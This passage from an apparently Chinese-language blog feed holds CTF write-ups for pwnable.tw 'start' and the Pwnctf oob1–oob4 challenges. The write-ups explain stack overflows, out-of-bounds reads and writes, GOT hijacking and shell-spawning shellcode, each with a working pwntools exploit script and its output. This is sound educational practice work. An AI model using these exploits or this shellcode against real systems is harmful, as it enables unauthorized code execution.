class="line">   0x08048073 &lt;+19&gt;:    push   0x20656874</span><br><span class="line">   0x08048078 &lt;+24&gt;:    push   0x20747261</span><br><span class="line">   0x0804807d &lt;+29&gt;:    push   0x74732073</span><br><span class="line">   0x08048082 &lt;+34&gt;:    push   0x2774654c</span><br><span class="line">   0x08048087 &lt;+39&gt;:    mov    ecx,esp</span><br><span class="line">   0x08048089 &lt;+41&gt;:    mov    dl,0x14</span><br><span class="line">   0x0804808b &lt;+43&gt;:    mov    bl,0x1</span><br><span class="line">   0x0804808d &lt;+45&gt;:    mov    al,0x4</span><br><span class="line">   0x0804808f &lt;+47&gt;:    int    0x80</span><br><span class="line">   0x08048091 &lt;+49&gt;:    xor    ebx,ebx</span><br><span class="line">   0x08048093 &lt;+51&gt;:    mov    dl,0x3c</span><br><span class="line">   0x08048095 &lt;+53&gt;:    mov    al,0x3</span><br><span class="line">   0x08048097 &lt;+55&gt;:    int    0x80</span><br><span class="line">   0x08048099 &lt;+57&gt;:    add    esp,0x14</span><br><span class="line">   0x0804809c &lt;+60&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Inspecting-Assembly-Instructions"><a href="#0x2-Inspecting-Assembly-Instructions" class="headerlink" title="0x2 Inspecting Assembly Instructions"></a>0x2 Inspecting Assembly Instructions</h2><p>對應上面的圖為了方便說明，我用偏移量來代表各條指令：</p><table><thead><tr><th align="center">偏移量</th><th align="center">說明</th></tr></thead><tbody><tr><td align="center">+0</td><td align="center">saved esp</td></tr><tr><td align="center">+1</td><td align="center">push exit_addr</td></tr><tr><td align="center">+6 ~ +12</td><td align="center">initialize 4 registers</td></tr><tr><td align="center">+14 ~ +34</td><td align="center">push “Let’s start the CTF:”</td></tr><tr><td align="center">+39 ~ +47</td><td align="center">write(fd &#x3D; 1, *buf &#x3D; esp, count &#x3D; 0x14)</td></tr><tr><td align="center">+49 ~ +55</td><td align="center">read(fd &#x3D; 1, *buf &#x3D; esp, count &#x3D; 0x3c)</td></tr><tr><td align="center">+57</td><td align="center">esp + 0x14</td></tr><tr><td align="center">+60</td><td align="center">ret</td></tr></tbody></table><p>我們來用表格整理一下目前 stack 的狀態，假設一開始程式執行前 esp 的地址在 x，然後由上往下是低位到高位</p><table><thead><tr><th align="center">地址</th><th align="center">數值</th><th align="center">備註</th></tr></thead><tbody><tr><td align="center">x-28</td><td align="center">0x2774654c</td><td align="center">“Let’”</td></tr><tr><td align="center">x-24</td><td align="center">0x74732073</td><td align="center">“s st”</td></tr><tr><td align="center">x-20</td><td align="center">0x20747261</td><td align="center">“art “</td></tr><tr><td align="center">x-16</td><td align="center">0x20656874</td><td align="center">“the “</td></tr><tr><td align="center">x-12</td><td align="center">0x3a465443</td><td align="center">“CTF:”</td></tr><tr><td align="center">x-8</td><td align="center">0x804809d</td><td align="center">exit_addr</td></tr><tr><td align="center">x-4</td><td align="center">x</td><td align="center">saved esp</td></tr><tr><td align="center">x</td><td align="center">?</td><td align="center">old esp</td></tr></tbody></table><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><p>在上一個部分我們可以發現 read 的時候會有 bof 的問題，所以我們可以控 eip。而且保護機制全關所以可以直接 ret2sc，但問題是我們不知道 stack 的地址，因此需要先 leak 有用的資訊，做法是可以在 ret 填上 write 的位址，因為在 ret 前 esp 被推到 ret 上面，所以第二次 call write 前 esp 在 x-8 上面，call 完 write 後 esp 到 x-4 的位置，由 x-4 往後輸出 20 bytes，我們就可以拿到一開始的 saved esp。<br>把攻擊後的樣子也整理表格應該會比較好理解，要分清楚這題址和值的關係，然後留意 esp 的變化，read 和 write 都是以 esp 為起始讀寫，第一次的 offset 用 Ａ 表示，第二次為 B：</p><table><thead><tr><th align="center">地址</th><th align="center">數值</th><th align="center">備註</th></tr></thead><tbody><tr><td align="center">x-28</td><td align="center">0x2774654c -&gt; AAAA</td><td align="center">“Let’”</td></tr><tr><td align="center">x-24</td><td align="center">0x74732073 -&gt; AAAA</td><td align="center">“s st”</td></tr><tr><td align="center">x-20</td><td align="center">0x20747261 -&gt; AAAA</td><td align="center">“art “</td></tr><tr><td align="center">x-16</td><td align="center">0x20656874 -&gt; AAAA</td><td align="center">“the “</td></tr><tr><td align="center">x-12</td><td align="center">0x3a465443 -&gt; AAAA</td><td align="center">“CTF:”</td></tr><tr><td align="center">x-8</td><td align="center">0x804809d -&gt; 0x8048087</td><td align="center">exit_addr -&gt; write_addr</td></tr><tr><td align="center">x-4</td><td align="center">x -&gt; BBBB</td><td align="center">saved esp</td></tr><tr><td align="center">x</td><td align="center">? -&gt; BBBB</td><td align="center">old esp</td></tr><tr><td align="center">x+4</td><td align="center">? -&gt; BBBB</td><td align="center"></td></tr><tr><td align="center">x+8</td><td align="center">? -&gt; BBBB</td><td align="center"></td></tr><tr><td align="center">x+12</td><td align="center">? -&gt; BBBB</td><td align="center"></td></tr><tr><td align="center">x+16</td><td align="center">x+20</td><td align="center"></td></tr><tr><td align="center">x+20</td><td align="center">shellcode</td><td align="center"></td></tr></tbody></table><p>我們 leak 出來的位址是 x，x+20 是 shellcode 的起始位置，所以我們在 ret ，也就是 x+16 的位址填上 x+20。</p><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./start&#x27;)</span></span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(write)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, p1)</span><br><span class="line">old_esp = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">r.recv()</span><br><span class="line">success(<span class="string">&#x27;Old_esp = %s&#x27;</span> % <span class="built_in">hex</span>(old_esp))</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov al, 0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x14</span> + p32(old_esp + <span class="number">0x14</span>) + asm(shellcode)</span><br><span class="line">r.send(p2)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">[+] Old_esp = 0xffaf0770</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">FLAG&#123;??????????????????&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x5-References"><a href="#0x5-References" class="headerlink" title="0x5 References"></a>0x5 References</h2><p>寫這篇之前看了好多份 writeup，發現好多人都有講錯qq，下面附上一些講解得比較清楚的 writeup 給大家參考，用表格說明真的是一個不錯的方式 XD</p><p><a class="link"   href="https://b1n.io/posts/pwnable.tw-start/" >https://b1n.io/posts/pwnable.tw-start/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/weixin_43483799/article/details/113844032" >https://blog.csdn.net/weixin_43483799/article/details/113844032 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>shellcode 的部分可以選擇直接手刻，或是參考下面這個網站也可以：<br><a class="link"   href="https://www.exploit-db.com/search?type=shellcode&platform=linux_x86" >https://www.exploit-db.com/search?type=shellcode&amp;platform=linux_x86 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-start&quot;&gt;&lt;a href=&quot;#Pwnable-tw-start&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - start&quot;&gt;&lt;/a&gt;Pwnable.tw - start&lt;/h1&gt;&lt;h3 id=&quot;Descr</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="ret2sc" scheme="https://kazma.tw/tags/ret2sc/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob4 Writeup</title>
    <link href="https://kazma.tw/2024/02/06/Pwnctf-oob4-Writeup/"/>
    <id>https://kazma.tw/2024/02/06/Pwnctf-oob4-Writeup/</id>
    <published>2024-02-05T18:50:53.000Z</published>
    <updated>2024-02-05T19:19:17.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob4"><a href="#oob4" class="headerlink" title="oob4"></a>oob4</h1><p>這題執行起來跟 oob2, oob3 一樣（如下所示），但跟 oob3 不同的是他這次把變數都宣告在 main 裡面所以 offset 會不太一樣，但一樣是要 oob write 然後 ret2win，我把 stack 整理在下面來解釋 offset 是怎麼算的：</p><p>執行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob3</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>stack:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rbp-0x5c <span class="comment"># input_id (rsp)</span></span><br><span class="line">rbp-0x58 <span class="comment"># input_pw</span></span><br><span class="line">rbp-0x54 <span class="comment"># index</span></span><br><span class="line">rbp-0x50 <span class="comment"># admin pw </span></span><br><span class="line">rbp-0x4c <span class="comment"># alice pw</span></span><br><span class="line">rbp-0x48 <span class="comment"># bob pw</span></span><br><span class="line">rbp-0x44 <span class="comment"># guest pw</span></span><br><span class="line">rbp-0x40 <span class="comment"># admin string</span></span><br><span class="line">rbp-0x38 <span class="comment"># alice string</span></span><br><span class="line">rbp-0x30 <span class="comment"># bob string</span></span><br><span class="line">rbp-0x28 <span class="comment"># guest</span></span><br><span class="line">rbp-0x18 <span class="comment"># canary</span></span><br><span class="line">rbp-0x10</span><br></pre></td></tr></table></figure></div><p>然後附上輸入 Nickname 的 fgets：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob4_r2.png"                      alt="r2"                ><br>因為在 call 完 fgets 之後會 ret 回 main，所以可以把 win 寫在 rsp - 8 的位置，offset 是：<br><code>(0x40 - 0x5c - 0x8) / 8 = -5</code></p><p>exploit 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x4007e6</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-5&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, p64(win))</span><br><span class="line">r.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob4&#x27;</span>: pid 66498</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> BreakALLCTF&#123;EpKa0zXqkYldHXKknjqB&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob4&quot;&gt;&lt;a href=&quot;#oob4&quot; class=&quot;headerlink&quot; title=&quot;oob4&quot;&gt;&lt;/a&gt;oob4&lt;/h1&gt;&lt;p&gt;這題執行起來跟 oob2, oob3 一樣（如下所示），但跟 oob3 不同的是他這次把變數都宣告在 main 裡面所以 o</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob3 Writeup</title>
    <link href="https://kazma.tw/2024/02/05/Pwnctf-oob3-Writeup/"/>
    <id>https://kazma.tw/2024/02/05/Pwnctf-oob3-Writeup/</id>
    <published>2024-02-04T17:35:21.000Z</published>
    <updated>2024-02-04T18:00:47.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob3"><a href="#oob3" class="headerlink" title="oob3"></a>oob3</h1><p>這題執行起來跟 oob2 一樣（如下所示），但是逆向看會發現用 admin 登入之後他不會幫我們開 shell，但是有 win 可以開 shell，所以這題其實就是 oob write 的 ret2win，這裡選擇的做法是 Got Hijacking，隨便選一個 fgets 之後出現的函式都可以。</p><p>執行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob3</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>exploit 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./oob3&quot;</span>)</span><br><span class="line">win = <span class="number">0x400924</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;-17&quot;</span>) <span class="comment">#0x601038 &lt;strcspn@GLIBC_2.2.5&gt;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p64(win))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;cat f*&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob3&#x27;</span>: pid 3521008</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> BreakALLCTF&#123;Dmq1Qe1QYOhxae8KhxVc&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob3&quot;&gt;&lt;a href=&quot;#oob3&quot; class=&quot;headerlink&quot; title=&quot;oob3&quot;&gt;&lt;/a&gt;oob3&lt;/h1&gt;&lt;p&gt;這題執行起來跟 oob2 一樣（如下所示），但是逆向看會發現用 admin 登入之後他不會幫我們開 shell，但是有 wi</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob2 Writeup</title>
    <link href="https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/"/>
    <id>https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/</id>
    <published>2024-01-18T16:05:09.000Z</published>
    <updated>2024-01-18T16:18:50.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob2"><a href="#oob2" class="headerlink" title="oob2"></a>oob2</h1><p>這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob2</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>那跟上一題基本上解法一樣，我們原本是 oob read admin 的 pincode 那現在變成是 oob write admin 的 pincode，exploit 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;-4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p32(<span class="number">1</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;kazma&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob2&#x27;</span>: pid 14326</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging as [kazma] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;DJPD61GTBQIqqL7sWEvF&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob2&quot;&gt;&lt;a href=&quot;#oob2&quot; class=&quot;headerlink&quot; title=&quot;oob2&quot;&gt;&lt;/a&gt;oob2&lt;/h1&gt;&lt;p&gt;這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob1 Writeup</title>
    <link href="https://kazma.tw/2024/01/17/Pwnctf-oob1-Writeup/"/>
    <id>https://kazma.tw/2024/01/17/Pwnctf-oob1-Writeup/</id>
    <published>2024-01-16T17:04:53.000Z</published>
    <updated>2024-01-16T18:09:04.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob1"><a href="#oob1" class="headerlink" title="oob1"></a>oob1</h1><p>執行後可以觀察到這題的情境是一個登入系統，首先會讓我們輸入 User ID，然後輸入密碼，再來會顯示我們嘗試登入的使用者名稱，最後輸出結果，如下所示：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob1</span><br><span class="line">User ID: 3</span><br><span class="line">PIN: 1324</span><br><span class="line">Logging to [guest] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br><span class="line"></span><br><span class="line">User ID: 0</span><br><span class="line">PIN: 0000</span><br><span class="line">Logging to [admin] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br><span class="line"></span><br><span class="line">User ID: 5</span><br><span class="line">non-existed ID!</span><br></pre></td></tr></table></figure></div><p>這題的關鍵是在讀取 User ID 時沒有做檢查，又他會顯示我們正在嘗試登入的使用者，因此可以透過 oob read 去讀取到 admin 的一開始設定的隨機密碼：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob1_key.png"                      alt="key"                ></p><p>從上面可以看到 obj.user 的位置在 0x6010c0，那我們接下來就找 admin 的密碼放在哪個位置：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob1_pass.png"                      alt="pass"                ></p><p>從上面可以找到 obj.pincode 在 0x6010a0，跟 obj.user 差 0x20，又原本的功能是要取其他 username 所以 rax 會左移三個 bits，也就是乘以 8，故 User ID 輸入 -4 可以 oob read 我們想要的東西，然後 information leak 完之後再把結果吃回來整理一下，登入 admin 即可走到 win func，exploit 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./oob1&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1234&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">pin = u32(r.recvuntil(<span class="string">&quot;]&quot;</span>)[:-<span class="number">1</span>][:<span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pin: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob1&#x27;</span>: pid 2841934</span><br><span class="line">pin: 151386595</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging to [admin] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;CPuPeMrhVrWWx2XueaIr&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob1&quot;&gt;&lt;a href=&quot;#oob1&quot; class=&quot;headerlink&quot; title=&quot;oob1&quot;&gt;&lt;/a&gt;oob1&lt;/h1&gt;&lt;p&gt;執行後可以觀察到這題的情境是一個登入系統，首先會讓我們輸入 User ID，然後輸入密碼，再來會顯示我們嘗試登入的使用者名稱</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf fmtstr Writeup</title>
    <link href="https://kazma.tw/2024/01/10/Pwnctf-fmtstr-Writeup/"/>
    <id>https://kazma.tw/2024/01/10/Pwnctf-fmtstr-Writeup/</id>
    <published>2024-01-09T17:21:15.000Z</published>
